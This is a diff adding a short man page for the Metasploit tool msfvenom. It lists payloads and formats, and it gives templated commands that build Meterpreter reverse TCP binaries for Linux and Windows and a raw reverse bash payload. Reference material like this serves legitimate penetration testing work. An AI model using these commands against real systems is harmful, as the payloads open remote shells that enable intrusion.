@@ -1,0 +1,42 @@
+.TH msfvenom
+.PP
+.RS
+Manually generate payloads for metasploit.
+More information: \[la]https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom\[ra]\&.
+.RE
+.RS
+.IP \(bu 2
+List payloads:
+.RE
+.PP
+\fB\fCmsfvenom \-l payloads\fR
+.RS
+.IP \(bu 2
+List formats:
+.RE
+.PP
+\fB\fCmsfvenom \-l formats\fR
+.RS
+.IP \(bu 2
+Show payload options:
+.RE
+.PP
+\fB\fCmsfvenom \-p {{payload}} \-\-list\-options\fR
+.RS
+.IP \(bu 2
+Create an ELF binary with a reverse TCP handler:
+.RE
+.PP
+\fB\fCmsfvenom \-p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} \-f elf \-o {{path/to/binary}}\fR
+.RS
+.IP \(bu 2
+Create an EXE binary with a reverse TCP handler:
+.RE
+.PP
+\fB\fCmsfvenom \-p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} \-f exe \-o {{path/to/binary.exe}}\fR
+.RS
+.IP \(bu 2
+Create a raw bash with a reverse TCP handler:
+.RE
+.PP
+\fB\fCmsfvenom \-p cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} \-f raw\fR
